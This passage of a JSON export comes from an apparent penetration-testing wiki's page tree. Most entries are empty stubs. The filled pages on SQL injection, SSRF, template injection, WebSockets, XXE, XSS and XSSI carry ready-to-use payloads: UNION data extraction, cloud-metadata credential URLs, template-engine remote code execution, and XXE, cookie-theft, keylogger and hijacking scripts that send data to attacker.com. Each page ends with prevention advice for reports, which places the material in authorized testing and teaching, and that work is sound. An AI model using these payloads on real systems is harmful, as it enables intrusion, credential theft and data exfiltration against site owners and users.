     "status": "empty",
     "updated": null
    },
    {
     "title": "Reverse Tab Nabbing",
     "slug": "reverse-tab-nabbing",
     "type": "page",
     "children": [],
     "tag": "TAG-0716",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "RSQL Injection",
     "slug": "rsql-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0717",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "SAML Attacks",
     "slug": "saml-attacks",
     "type": "page",
     "children": [
      {
       "title": "SAML Basics",
       "slug": "saml-basics",
       "type": "page",
       "children": [],
       "tag": "TAG-0719",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0718",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Server Side Inclusion/Edge Side Inclusion Injection",
     "slug": "server-side-inclusionedge-side-inclusion-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0720",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Soap Jax Ws Threadlocal Auth Bypass",
     "slug": "soap-jax-ws-threadlocal-auth-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0721",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "SQL Injection",
     "slug": "sql-injection",
     "type": "page",
     "children": [
      {
       "title": "MS Access SQL Injection",
       "slug": "ms-access-sql-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0723",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "MSSQL Injection",
       "slug": "mssql-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0724",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "MySQL injection",
       "slug": "mysql-injection",
       "type": "page",
       "children": [
        {
         "title": "MySQL File priv to SSRF/RCE",
         "slug": "mysql-file-priv-to-ssrfrce",
         "type": "page",
         "children": [],
         "tag": "TAG-0726",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0725",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Oracle injection",
       "slug": "oracle-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0727",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cypher Injection (neo4j)",
       "slug": "cypher-injection-neo4j",
       "type": "page",
       "children": [],
       "tag": "TAG-0728",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Sqlmap",
       "slug": "sqlmap",
       "type": "page",
       "children": [],
       "tag": "TAG-0729",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PostgreSQL injection",
       "slug": "postgresql-injection",
       "type": "page",
       "children": [
        {
         "title": "dblink/lo_import data exfiltration",
         "slug": "dblinkloimport-data-exfiltration",
         "type": "page",
         "children": [],
         "tag": "TAG-0731",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "PL/pgSQL Password Bruteforce",
         "slug": "plpgsql-password-bruteforce",
         "type": "page",
         "children": [],
         "tag": "TAG-0732",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Network - Privesc, Port Scanner and NTLM chanllenge response disclosure",
         "slug": "network---privesc-port-scanner-and-ntlm-chanllenge-response-",
         "type": "page",
         "children": [],
         "tag": "TAG-0733",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Big Binary Files Upload (PostgreSQL)",
         "slug": "big-binary-files-upload-postgresql",
         "type": "page",
         "children": [],
         "tag": "TAG-0734",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "RCE with PostgreSQL Languages",
         "slug": "rce-with-postgresql-languages",
         "type": "page",
         "children": [],
         "tag": "TAG-0735",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "RCE with PostgreSQL Extensions",
         "slug": "rce-with-postgresql-extensions",
         "type": "page",
         "children": [],
         "tag": "TAG-0736",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0730",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SQLMap - CheatSheet",
       "slug": "sqlmap---cheatsheet",
       "type": "page",
       "children": [
        {
         "title": "Second Order Injection - SQLMap",
         "slug": "second-order-injection---sqlmap",
         "type": "page",
         "children": [],
         "tag": "TAG-0738",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0737",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0722",
     "content": "# SQL Injection\n\n## Detection\n```\n' \n\"\n' OR '1'='1\n' OR SLEEP(5)-- -\n1' AND 1=1-- -\n1' AND 1=2-- -\n```\nIf the page behaves differently between `1=1` and `1=2` (error, content change, timing), it's a strong signal.\n\n## Types\n- **In-band (error/union-based)**: response directly reflects data or DB errors.\n- **Blind boolean-based**: page behavior changes (content differs) but no data is returned directly.\n- **Blind time-based**: use `SLEEP()`/`WAITFOR DELAY` and measure response time.\n- **Out-of-band**: exfiltrate via DNS/HTTP requests the DB itself triggers (useful when no other channel exists).\n\n## UNION-Based Exploitation\n```sql\n-- Find column count first\n' ORDER BY 1-- -\n' ORDER BY 2-- -   (increment until error)\n\n-- Find which columns reflect in output\n' UNION SELECT 1,2,3-- -\n\n-- Extract data (MySQL example)\n' UNION SELECT username,password,3 FROM users-- -\n```\n\n## Time-Based Blind (when nothing reflects)\n```sql\n' AND (SELECT SLEEP(5) FROM users WHERE username='admin')-- -\n' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- -\n```\n\n## Database-Specific Fingerprinting\n| DB | Comment syntax | Version function |\n|---|---|---|\n| MySQL | `-- -` or `#` | `SELECT @@version` |\n| MSSQL | `--` | `SELECT @@version` |\n| PostgreSQL | `--` | `SELECT version()` |\n| Oracle | `--` | `SELECT banner FROM v$version` |\n\n## WAF Bypass Ideas\n- Case variation (`SeLeCt`), inline comments (`/**/`), encoding (URL/double-URL/Unicode), whitespace alternatives (`%0a`, `/**/` instead of space).\n\n## Automation\n```bash\nsqlmap -u \"https://target.com/item?id=1\" --batch --dbs\nsqlmap -u \"https://target.com/item?id=1\" --batch -D appdb --tables\nsqlmap -r request.txt --batch --level 5 --risk 3   # from a captured Burp request\n```\n\n## Prevention (for the report's remediation section)\nParameterized queries/prepared statements — always. Input validation and least-privilege DB accounts are defense-in-depth, not substitutes for parameterization.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "SSRF (Server Side Request Forgery)",
     "slug": "ssrf-server-side-request-forgery",
     "type": "page",
     "children": [
      {
       "title": "URL Format Bypass",
       "slug": "url-format-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0740",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SSRF Vulnerable Platforms",
       "slug": "ssrf-vulnerable-platforms",
       "type": "page",
       "children": [],
       "tag": "TAG-0741",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cloud SSRF",
       "slug": "cloud-ssrf",
       "type": "page",
       "children": [],
       "tag": "TAG-0742",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0739",
     "content": "# Server-Side Request Forgery (SSRF)\n\n## Where to Look\nAny feature where the server fetches a URL on your behalf: webhooks, \"import from URL\", PDF/screenshot generators, image proxies, URL preview/unfurling, XML parsers (via external entities), PDF export tools.\n\n## Basic Detection\n```\nhttp://<your-collaborator-domain>/probe\n```\nIf your listener (Burp Collaborator, or a simple `nc -lvnp 80` + public IP) receives a request, SSRF is confirmed — even if the response isn't reflected back to you (blind SSRF).\n\n## High-Value Targets Once Confirmed\n```\nhttp://169.254.169.254/latest/meta-data/                     # AWS instance metadata\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/<role>   # AWS temp creds\nhttp://metadata.google.internal/computeMetadata/v1/           # GCP (needs Metadata-Flavor: Google header)\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (needs Metadata: true header)\n```\nCloud metadata endpoints frequently hand over IAM credentials directly — this is usually the highest-impact outcome of an SSRF finding.\n\n## Bypassing Basic Filters\n| Filter | Bypass |\n|---|---|\n| Blocks \"localhost\" | `127.0.0.1`, `0.0.0.0`, `[::1]`, `2130706433` (decimal), `0x7f000001` (hex) |\n| Blocks 127.0.0.1 literal | DNS rebinding — a domain that resolves to 127.0.0.1 |\n| Blocks internal IP ranges | URL with `@`: `http://expected-safe-domain@127.0.0.1/`, or redirect chains (302 to internal IP) |\n| Scheme restricted to http/https | Try `file://`, `gopher://`, `dict://` for protocol smuggling if the fetcher isn't strict |\n\n## Blind SSRF → Internal Port Scanning\nFire requests at internal IP:port combinations and time the response (open ports connect+respond faster/differently than filtered ones) — effectively turns the vulnerable server into your scanning proxy for the internal network.\n\n## Gopher-Based Protocol Smuggling (Advanced)\nWhen `gopher://` is allowed, you can craft raw bytes to speak to internal services (Redis, internal HTTP APIs) that would otherwise be unreachable — e.g., issuing raw Redis commands via a crafted gopher URL to achieve write access on an internal Redis instance.\n\n## Prevention (for reports)\nAllowlist (not denylist) permitted destination hosts/schemes, disable following redirects on the server-side fetcher, and never let application logic reach the cloud metadata IP range — block it at the network layer regardless of app-level filtering.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "SSTI (Server Side Template Injection)",
     "slug": "ssti-server-side-template-injection",
     "type": "page",
     "children": [
      {
       "title": "EL - Expression Language",
       "slug": "el---expression-language",
       "type": "page",
       "children": [],
       "tag": "TAG-0744",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Jinja2 SSTI",
       "slug": "jinja2-ssti",
       "type": "page",
       "children": [],
       "tag": "TAG-0745",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0743",
     "content": "# SSTI (Server-Side Template Injection)\n\n## Concept\nTemplating engines (Jinja2, Twig, FreeMarker, Velocity, Handlebars, etc.) evaluate expressions inside special delimiters (`{{ }}`, `${ }`, etc.). If user input gets concatenated directly into a template string *before* rendering (instead of being passed safely as data), your input gets evaluated as template code — which in most engines gives a path to full RCE.\n\n## Detection\n```\n${7*7}\n{{7*7}}\n{{7*'7'}}\n<%= 7*7 %>\n#{7*7}\n```\nIf a `49` (or `7777777` for the string-multiply variant, which is Python/Jinja2-specific behavior) appears in the output, you've got template injection — the string-multiply payload also helps distinguish it from a simple math-evaluation bug elsewhere.\n\n## Identifying the Engine\n| Payload | Fires on |\n|---|---|\n| `{{7*7}}` → 49 | Jinja2, Twig |\n| `{{7*'7'}}` → 7777777 | Jinja2 specifically (string repetition) |\n| `${7*7}` → 49 | FreeMarker, Velocity (varies) |\n| `#{7*7}` → 49 | Some Ruby-based / OGNL-based engines |\n| `${{7*7}}` | Struts/OGNL-style engines (nested delimiter) |\n\n## Jinja2 → RCE (Python, Very Common in the Wild)\n```python\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n```\nWalk the class hierarchy to find something like `subprocess.Popen`, then instantiate it:\n```python\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n```\nOr, more directly if `os`/`subprocess` classes are reachable in `__subclasses__()`:\n```python\n{{ ().__class__.__bases__[0].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate() }}\n```\n(index varies by Python version/environment — brute-force it or filter the subclass list for `'Popen'` in the name first.)\n\n## Twig (PHP) → RCE\n```php\n{{ ['id'] | filter('system') }}\n{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}\n```\n\n## FreeMarker (Java) → RCE\n```\n<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n```\n\n## Distinguishing SSTI from Plain XSS\nIf `{{7*7}}` reflects as literal text `{{7*7}}`, it's likely just being HTML-escaped (possible XSS, not SSTI). If it reflects as `49`, the expression was *evaluated* server-side — that's the SSTI signal.\n\n## Where to Look\nAny feature that builds a template/document dynamically from user input: email template previews, PDF/report generators, \"customize your page\" features, and CMS theme editors are classic sources.\n\n## Prevention (for reports)\nNever build templates by string-concatenating user input; treat user input strictly as *data* passed into a pre-defined template context. If dynamic templating is genuinely required, use the engine's sandboxed-execution mode and strip dangerous built-ins.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Timing Attacks",
     "slug": "timing-attacks",
     "type": "page",
     "children": [],
     "tag": "TAG-0746",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Unicode Injection",
     "slug": "unicode-injection",
     "type": "page",
     "children": [
      {
       "title": "Unicode Normalization",
       "slug": "unicode-normalization",
       "type": "page",
       "children": [],
       "tag": "TAG-0748",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0747",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "UUID Insecurities",
     "slug": "uuid-insecurities",
     "type": "page",
     "children": [],
     "tag": "TAG-0749",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "WebSocket Attacks",
     "slug": "websocket-attacks",
     "type": "page",
     "children": [],
     "tag": "TAG-0750",
     "content": "# WebSocket Security Testing\n\n## Concept\nWebSockets establish a persistent, bidirectional connection after an initial HTTP handshake. Because that handshake is just an HTTP request, many classic web vulnerabilities carry over — but the always-on nature of the connection also introduces attack surface REST APIs don't have.\n\n## Cross-Site WebSocket Hijacking (CSWSH)\nWebSocket handshake requests carry cookies automatically, just like normal HTTP requests — and critically, **the `Origin` header must be validated server-side**, because the browser's Same-Origin Policy doesn't block WebSocket connections the way it blocks fetch/XHR by default.\n```html\n<script>\n  var ws = new WebSocket(\"wss://target.com/chat\");\n  ws.onopen = function() { ws.send(\"get_history\"); };\n  ws.onmessage = function(e) { fetch('https://attacker.com/exfil?d=' + btoa(e.data)); };\n</script>\n```\nHosted on an attacker page, this silently connects using the victim's session cookie and exfiltrates whatever the socket returns — if the server never checks the `Origin` header on the handshake, this works exactly like CSRF but for a live data stream instead of one-off requests.\n\n## Testing for Origin Validation\n```bash\n# Manually craft a handshake with a bogus Origin header and see if the server still upgrades the connection\ncurl -i -N \\\n  -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\n  -H \"Origin: https://evil.com\" \\\n  -H \"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\" \\\n  -H \"Sec-WebSocket-Version: 13\" \\\n  https://target.com/chat\n```\nA `101 Switching Protocols` response despite the attacker `Origin` confirms the vulnerability.\n\n## Message-Level Injection\nOnce connected, treat each message like any other user input channel — the underlying transport being a socket doesn't exempt it from injection testing:\n- SQLi/NoSQLi if messages feed into a backend query.\n- Stored/reflected XSS if a message gets echoed to other connected clients unsanitized (chat apps are the classic case).\n- Business-logic abuse — e.g., a game/trading app trusting client-sent state (price, score, position) instead of recalculating server-side.\n\n## Intercepting & Replaying WebSocket Traffic\nBurp Suite's WebSockets tab captures the full message history per connection and lets you resend/tamper individual messages — the natural equivalent of Repeater for this protocol.\n\n## DoS Considerations\nPersistent connections consume server resources for their entire lifetime — test whether the server enforces connection limits per user/IP, and whether message-rate limiting exists once connected (an open socket can often send far more requests per second than an equivalent HTTP polling loop would allow through a rate limiter).\n\n## Prevention (for reports)\nValidate `Origin` against a strict allowlist during the handshake (never trust cookies alone as sufficient auth for the socket), apply the same input validation/authorization discipline to socket messages as to REST endpoints, and enforce connection/message rate limits.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Web Tool - WFuzz",
     "slug": "web-tool---wfuzz",
     "type": "page",
     "children": [],
     "tag": "TAG-0751",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "XPATH injection",
     "slug": "xpath-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0752",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "XS Search",
     "slug": "xs-search",
     "type": "page",
     "children": [],
     "tag": "TAG-0753",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "XSLT Server Side Injection (Extensible Stylesheet Language Transformations)",
     "slug": "xslt-server-side-injection-extensible-stylesheet-language-tr",
     "type": "page",
     "children": [],
     "tag": "TAG-0754",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "XXE - XEE - XML External Entity",
     "slug": "xxe---xee---xml-external-entity",
     "type": "page",
     "children": [],
     "tag": "TAG-0755",
     "content": "# XXE (XML External Entity) Injection\n\n## Concept\nXML supports defining custom \"entities\" that reference external resources. If an app parses attacker-supplied XML with external entity resolution enabled (still the default in many older XML parsers), you can make the parser read local files, make outbound requests (SSRF), or in some configurations achieve DoS/RCE.\n\n## Basic File Read\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<data>&xxe;</data>\n```\n\n## Blind XXE (No Direct Output) — Out-of-Band Exfiltration\nWhen the response doesn't reflect the entity's value directly, exfiltrate via a request the parser itself makes:\n```xml\n<!DOCTYPE data [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n```\nWhere `evil.dtd` (hosted on your server) contains:\n```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY % exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n%eval;\n%exfil;\n```\nThe target server fetches your DTD, resolves the local file, then makes a second outbound request embedding its contents — visible in your listener's access log even with zero reflected output.\n\n## SSRF via XXE\n```xml\n<!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"> ]>\n<data>&xxe;</data>\n```\nSame cloud-metadata targets as any other SSRF once you can make the parser issue arbitrary outbound requests.\n\n## Billion Laughs (DoS via Entity Expansion)\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!-- continues exponentially -->\n]>\n<lolz>&lol9;</lolz>\n```\nEach layer multiplies memory usage exponentially — a few KB of XML can exhaust server memory.\n\n## Where to Look for XXE Beyond Obvious XML Endpoints\n- File uploads that accept SVG, DOCX, XLSX, or any Office Open XML format (these are ZIP archives of XML internally).\n- SOAP APIs (XML-based by definition).\n- SAML authentication flows (SAML assertions are XML).\n- Any \"import from XML/RSS feed\" feature.\n\n## Prevention (for reports)\nDisable external entity resolution and DTD processing entirely at the parser level (most modern XML libraries support a `disable-external-entities` or equivalent flag) — the safest fix is disabling this feature outright rather than trying to sanitize input, since XML has many equivalent ways to express the same attack.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "XSS (Cross Site Scripting)",
     "slug": "xss-cross-site-scripting",
     "type": "page",
     "children": [
      {
       "title": "Abusing Service Workers",
       "slug": "abusing-service-workers",
       "type": "page",
       "children": [],
       "tag": "TAG-0757",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Chrome Cache to XSS",
       "slug": "chrome-cache-to-xss",
       "type": "page",
       "children": [],
       "tag": "TAG-0758",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Debugging Client Side JS",
       "slug": "debugging-client-side-js",
       "type": "page",
       "children": [],
       "tag": "TAG-0759",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Dom Clobbering",
       "slug": "dom-clobbering",
       "type": "page",
       "children": [],
       "tag": "TAG-0760",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DOM Invader",
       "slug": "dom-invader",
       "type": "page",
       "children": [],
       "tag": "TAG-0761",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DOM XSS",
       "slug": "dom-xss",
       "type": "page",
       "children": [],
       "tag": "TAG-0762",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Iframes in XSS, CSP and SOP",
       "slug": "iframes-in-xss-csp-and-sop",
       "type": "page",
       "children": [],
       "tag": "TAG-0763",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Integer Overflow",
       "slug": "integer-overflow",
       "type": "page",
       "children": [],
       "tag": "TAG-0764",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JS Hoisting",
       "slug": "js-hoisting",
       "type": "page",
       "children": [],
       "tag": "TAG-0765",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Misc JS Tricks & Relevant Info",
       "slug": "misc-js-tricks-relevant-info",
       "type": "page",
       "children": [],
       "tag": "TAG-0766",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PDF Injection",
       "slug": "pdf-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0767",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Server Side XSS (Dynamic PDF)",
       "slug": "server-side-xss-dynamic-pdf",
       "type": "page",
       "children": [],
       "tag": "TAG-0768",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Shadow DOM",
       "slug": "shadow-dom",
       "type": "page",
       "children": [],
       "tag": "TAG-0769",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SOME - Same Origin Method Execution",
       "slug": "some---same-origin-method-execution",
       "type": "page",
       "children": [],
       "tag": "TAG-0770",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Sniff Leak",
       "slug": "sniff-leak",
       "type": "page",
       "children": [],
       "tag": "TAG-0771",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Steal Info JS",
       "slug": "steal-info-js",
       "type": "page",
       "children": [],
       "tag": "TAG-0772",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Wasm Linear Memory Template Overwrite Xss",
       "slug": "wasm-linear-memory-template-overwrite-xss",
       "type": "page",
       "children": [],
       "tag": "TAG-0773",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "XSS in Markdown",
       "slug": "xss-in-markdown",
       "type": "page",
       "children": [],
       "tag": "TAG-0774",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0756",
     "content": "# Cross-Site Scripting (XSS)\n\n## Types\n- **Reflected**: payload in the request, reflected immediately in the response (no persistence).\n- **Stored**: payload saved server-side (comment, profile field, etc.), fires for every viewer.\n- **DOM-based**: vulnerability lives entirely in client-side JS — server never sees the malicious part of the payload (e.g., `location.hash` written unsafely into the DOM).\n\n## Basic Detection Payloads\n```html\n<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```\n\n## Context Matters — Match the Payload to Where You Land\n| Context | Payload style |\n|---|---|\n| HTML body | `<script>alert(1)</script>` |\n| HTML attribute | `\" onmouseover=\"alert(1)` or `\" autofocus onfocus=\"alert(1)` |\n| JS string | `';alert(1);//` |\n| URL/href attribute | `javascript:alert(1)` |\n| CSS context | `</style><script>alert(1)</script>` |\n\n## Filter Bypass Ideas\n```html\n<ScRiPt>alert(1)</sCriPt>              <!-- case variation -->\n<img src=x onerror=alert`1`>           <!-- backticks instead of parens -->\n<svg/onload=alert(1)>                  <!-- slash instead of space -->\n<img src=x onerror=&#97;lert(1)>       <!-- HTML entity encoding -->\n```\n\n## DOM XSS — Look for These Sinks\n```js\ndocument.write()\nelement.innerHTML = \neval()\nlocation = \nelement.outerHTML =\n```\nTrace back from the sink to the source (`location.hash`, `document.URL`, `window.name`, `postMessage` data) — if user-controlled data reaches a sink unsanitized, it's exploitable.\n\n## Practical Exploitation Beyond alert(1)\n```html\n<!-- Cookie theft -->\n<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\n<!-- Keylogger -->\n<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>\n\n<!-- CSRF-token exfil for full account takeover -->\n<script>fetch('/settings').then(r=>r.text()).then(t=>fetch('https://attacker.com/leak?d='+encodeURIComponent(t)))</script>\n```\n\n## CSP Bypass Considerations\n- Check `Content-Security-Policy` header first — a strict CSP without `unsafe-inline` blocks most basic payloads.\n- JSONP endpoints, Angular/whitelisted CDN script sources, or `script-src 'self'` combined with an upload feature that lands files under the same origin are common bypass vectors.\n\n## Prevention (for reports)\nContext-aware output encoding (not a single global filter), CSP as defense-in-depth, `HttpOnly`+`Secure` cookies to limit theft impact even if XSS exists.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "XSSI (Cross-Site Script Inclusion)",
     "slug": "xssi-cross-site-script-inclusion",
     "type": "page",
     "children": [],
     "tag": "TAG-0775",
     "content": "# XSSI (Cross-Site Script Inclusion)\n\n## Concept\nUnlike XSS (injecting script *into* a page), XSSI abuses the fact that `<script src=\"...\">` tags are exempt from the Same-Origin Policy for *reading network-level responses* — a page can include a script from any origin, and while it can't read the raw HTTP response, it *can* observe side effects of the JavaScript that script contains once it executes in the including page's context. If a \"JSON\" API endpoint is actually returned as valid, executable JavaScript (a common pattern for legacy \"JSONP-style\" or bare-array/object literal endpoints), a malicious page can include it as a script and hijack whatever global variables or callback it defines.\n\n## Classic Vulnerable Pattern\n```javascript\n// API response served with Content-Type: application/javascript (or even just text/html, loaded via <script>)\nvar userData = {\"email\":\"victim@target.com\",\"apiKey\":\"secret123\"};\n```\nAn attacker's page:\n```html\n<script>\n  function extractData() {\n    // if the victim's browser, authenticated to target.com, loads this include,\n    // \"userData\" becomes a global variable readable from the attacker's page context\n    if (typeof userData !== 'undefined') {\n      fetch('https://attacker.com/steal?d=' + JSON.stringify(userData));\n    }\n  }\n</script>\n<script src=\"https://target.com/api/user/data.js\" onload=\"extractData()\"></script>\n```\n\n## Array Constructor Override (Classic Technique for Bare JSON Arrays)\nIf the endpoint returns a bare JSON array `[\"secret1\",\"secret2\"]` (valid as a JS array literal, and historically exploitable even without a named global variable), an attacker can override the `Array` constructor before the include loads to intercept the data as it's constructed:\n```html\n<script>\n  function Array() {\n    var arr = this;\n    var idx = 0;\n    Object.defineProperty(arr, 0, {\n      set: function(val) { fetch('https://attacker.com/steal?d=' + val); }\n    });\n  }\n</script>\n<script src=\"https://target.com/api/secret-array.json\"></script>\n```\nModern browsers have largely closed this specific vector for bare-array JSON, but it remains a good illustration of why JSON responses should never be directly `<script>`-includable in the first place.\n\n## JSONP Callback Abuse\nJSONP intentionally wraps JSON in a caller-specified function call: `callback_name({\"data\":\"...\"})`. If the callback name isn't validated/allowlisted, this is inherently designed to be cross-origin includable — meaning any sensitive data returned via JSONP for an authenticated user is exposed to any site that knows the endpoint, unless CSRF-style origin checks gate *who* can trigger the authenticated request in the first place.\n\n## Detection Checklist\n- [ ] Does any authenticated API endpoint return `Content-Type: application/javascript` or `text/javascript`?\n- [ ] Does any endpoint return a bare JSON array as the top-level response (rather than wrapped in an object)?\n- [ ] Are JSONP endpoints present, and is the `callback` parameter validated against an allowlist?\n- [ ] Do sensitive endpoints check the `Referer`/`Origin` header before returning data, independent of session cookie validity?\n\n## Prevention (for reports)\nAlways serve JSON with `Content-Type: application/json` (browsers won't execute it as a script when included this way in modern engines), wrap top-level JSON responses in an object rather than a bare array as defense-in-depth, and avoid JSONP entirely in favor of CORS with a strict allowlist where cross-origin access is genuinely needed.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "XS-Search/XS-Leaks",
     "slug": "xs-searchxs-leaks",
     "type": "page",
     "children": [
      {
       "title": "Connection Pool Examples",
       "slug": "connection-pool-examples",
       "type": "page",
       "children": [],
       "tag": "TAG-0777",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Connection Pool by Destination Example",
       "slug": "connection-pool-by-destination-example",
       "type": "page",
       "children": [],
       "tag": "TAG-0778",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cookie Bomb + Onerror XS Leak",
       "slug": "cookie-bomb-onerror-xs-leak",
       "type": "page",
       "children": [],
       "tag": "TAG-0779",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "URL Max Length - Client Side",
       "slug": "url-max-length---client-side",
       "type": "page",
       "children": [],
       "tag": "TAG-0780",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "performance.now example",
       "slug": "performancenow-example",
       "type": "page",
       "children": [],
       "tag": "TAG-0781",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "performance.now + Force heavy task",
       "slug": "performancenow-force-heavy-task",
       "type": "page",
       "children": [],
       "tag": "TAG-0782",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Event Loop Blocking + Lazy images",
       "slug": "event-loop-blocking-lazy-images",
       "type": "page",
       "children": [],
       "tag": "TAG-0783",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JavaScript Execution XS Leak",
       "slug": "javascript-execution-xs-leak",
       "type": "page",
       "children": [],
       "tag": "TAG-0784",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "CSS Injection",
       "slug": "css-injection",
       "type": "page",
       "children": [
        {
         "title": "CSS Injection Code",
         "slug": "css-injection-code",
         "type": "page",
         "children": [],
         "tag": "TAG-0786",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "LESS Code Injection",
         "slug": "less-code-injection",
         "type": "page",
         "children": [],
         "tag": "TAG-0787",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0785",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0776",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Iframe Traps",
     "slug": "iframe-traps",
     "type": "page",
     "children": [],
     "tag": "TAG-0788",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#FFB347"
  },
  {
   "title": "⛈️ Cloud Security",
